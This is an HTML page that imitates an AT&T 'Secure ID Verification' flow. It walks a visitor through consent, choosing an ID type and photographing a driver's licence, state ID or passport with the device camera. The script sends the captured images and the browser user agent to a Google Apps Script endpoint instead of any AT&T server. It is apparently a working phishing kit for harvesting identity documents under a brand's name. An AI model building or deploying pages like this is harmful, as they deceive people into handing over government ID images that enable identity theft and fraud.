<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AT&T Secure ID Upload</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root{
      --att-blue:#00A8E0;
      --att-navy:#004B70;
      --att-ink:#172B3A;
      --gray:#f5f7f8;
    }
    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fff;color:var(--att-ink)}
    .page{display:none;max-width:420px;margin:40px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 4px 12px rgba(0,0,0,.08)}
    .page.active{display:block}
    h1{font-size:22px;margin:0 0 16px;color:var(--att-navy)}
    p{margin:0 0 20px}
    button{background:var(--att-blue);color:#fff;border:none;padding:12px 20px;font-size:16px;border-radius:12px;cursor:pointer;margin:6px 0;width:100%}
    button:disabled{opacity:.6;cursor:not-allowed}
    .options button{background:#fff;color:var(--att-navy);border:2px solid var(--att-blue);font-weight:600}
    video,canvas{width:100%;border-radius:12px;background:#000}
    .hidden{display:none!important}
  </style>
</head>
<body>

<!-- Consent Page -->
<div id="page-consent" class="page active">
  <h1>AT&T Secure ID Verification</h1>
  <p>By continuing, you consent to securely uploading a photo of your government-issued ID for verification.</p>
  <label><input type="checkbox" id="consentCheck"> I agree and consent</label>
  <button id="btnConsent" disabled>Continue</button>
</div>

<!-- ID Type Page -->
<div id="page-type" class="page">
  <h1>Select ID Type</h1>
  <div class="options">
    <button data-type="license">Driver’s License</button>
    <button data-type="state">State ID</button>
    <button data-type="passport">Passport</button>
  </div>
</div>

<!-- Capture Page -->
<div id="page-capture" class="page">
  <h1 id="captureTitle">Capture</h1>
  <video id="camera" autoplay playsinline></video>
  <canvas id="snapshot" class="hidden"></canvas>
  <div>
    <button id="btnCapture">Capture</button>
    <button id="btnRetake" class="hidden">Retake</button>
    <button id="btnSubmit" class="hidden">Submit</button>
  </div>
  <button id="btnBackType">Back</button>
  <p id="status"></p>
</div>

<script>
(function(){
  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4h9eN9CvbUHVwyTtQsXjHow-65YQ3YJE6XamHdJTAwAPz60eXS9TpVdeOa6b5bMVinw/exec";

  const pages = {
    consent: document.getElementById('page-consent'),
    type: document.getElementById('page-type'),
    capture: document.getElementById('page-capture')
  };
  const btnConsent=document.getElementById('btnConsent');
  const consentCheck=document.getElementById('consentCheck');
  const captureTitle=document.getElementById('captureTitle');
  const video=document.getElementById('camera');
  const canvas=document.getElementById('snapshot');
  const btnCapture=document.getElementById('btnCapture');
  const btnRetake=document.getElementById('btnRetake');
  const btnSubmit=document.getElementById('btnSubmit');
  const btnBackType=document.getElementById('btnBackType');
  const statusEl=document.getElementById('status');
  let idType=null;let step=null;let stream=null;let shots={};

  function goto(page){
    Object.values(pages).forEach(p=>p.classList.remove('active'));
    if(pages[page]) pages[page].classList.add('active');
  }
  function setStatus(t){statusEl.textContent=t;}

  consentCheck.addEventListener('change',()=>btnConsent.disabled=!consentCheck.checked);
  btnConsent.addEventListener('click',()=>goto('type'));

  // Select ID type
  pages.type.querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{
    idType=b.dataset.type;
    step= idType==='passport'?'passport-front':'front';
    startCamera();
    updateTitle();
    goto('capture');
  }));

  function updateTitle(){
    if(idType==='passport'){captureTitle.textContent="Capture Passport";}
    else if(step==='front'){captureTitle.textContent="Capture Front Side";}
    else if(step==='back'){captureTitle.textContent="Capture Back Side";}
  }

  async function startCamera(){
    if(stream){stream.getTracks().forEach(t=>t.stop());}
    try{
      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
      video.srcObject=stream;
      video.classList.remove('hidden');canvas.classList.add('hidden');
      btnCapture.classList.remove('hidden');btnRetake.classList.add('hidden');btnSubmit.classList.add('hidden');
      setStatus('');
    }catch(err){setStatus("Camera error: "+err.message);}
  }

  btnCapture.addEventListener('click',()=>{
    const ctx=canvas.getContext('2d');
    canvas.width=video.videoWidth;canvas.height=video.videoHeight;
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    video.classList.add('hidden');canvas.classList.remove('hidden');
    btnCapture.classList.add('hidden');btnRetake.classList.remove('hidden');btnSubmit.classList.remove('hidden');
  });

  btnRetake.addEventListener('click',()=>{startCamera();});

  btnSubmit.addEventListener('click',async()=>{
    try{
      setStatus("Processing…");
      const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));
      if(idType==='passport'){
        shots.passport=new File([blob],"passport.jpg",{type:"image/jpeg"});
      } else if(step==='front'){
        shots.front=new File([blob],"front.jpg",{type:"image/jpeg"});
      } else if(step==='back'){
        shots.back=new File([blob],"back.jpg",{type:"image/jpeg"});
      }
      if(idType!=='passport' && step==='front'){ // move to back
        step='back'; updateTitle(); startCamera(); return;
      }

      // Upload
      btnSubmit.disabled=true;btnRetake.disabled=true;btnBackType.disabled=true;
      setStatus("Uploading securely…");
      const fd=new FormData();
      fd.append('idType',idType);
      fd.append('userAgent',navigator.userAgent);
      if(idType==='passport'){fd.append('passport',shots.passport);}
      else {fd.append('front',shots.front);fd.append('back',shots.back);}
      const res=await fetch(SCRIPT_URL,{method:'POST',body:fd});
      if(!res.ok){throw new Error("Server "+res.status);}
      const json=await res.json();
      console.log("Server response",json);

      // ✅ Redirect to external success page
      window.location.href="success.html";
    }catch(err){
      console.error(err);setStatus("Upload failed: "+err.message);
      btnSubmit.disabled=false;btnBackType.disabled=false;
    }
  });

  btnBackType.addEventListener('click',()=>{goto('type');if(stream)stream.getTracks().forEach(t=>t.stop());});
})();
</script>
</body>
</html>
